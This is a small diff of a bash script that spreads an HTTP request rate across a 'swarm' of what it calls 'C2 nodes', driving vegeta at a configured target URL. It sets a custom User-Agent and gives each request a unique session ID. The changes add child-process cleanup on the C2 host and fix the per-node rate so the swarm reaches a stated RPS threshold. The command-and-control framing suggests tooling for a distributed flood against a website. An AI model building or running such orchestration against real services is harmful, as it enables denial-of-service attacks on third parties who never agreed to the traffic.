@@ -9,9 +9,14 @@
 #   swarm_size: total number of C2 nodes in the swarm.
 #   Per-node RPS = max_rps / swarm_size (aggregate stays at max_rps).
 SWARM_SIZE=${1:?"Usage: swarm_deploy.sh <swarm_size>"}
+
+# Clean up all child processes on exit (prevent zombie vegeta/python on headless C2)
+trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
+
 URL=$(jq -r .target_url swarm_config.json)
 TOTAL_RPS=$(jq -r .max_rps swarm_config.json)
-NODE_RPS=$((TOTAL_RPS / SWARM_SIZE))
+# awk for float division: bash truncates 850/15=56, missing threshold by 10 RPS.
+NODE_RPS=$(awk "BEGIN {printf \"%.2f\", $TOTAL_RPS / $SWARM_SIZE}")
 UA=$(jq -r '.headers["User-Agent"]' swarm_config.json)
 
 # Python target generator: vegeta HTTP format with unique session_id per request.
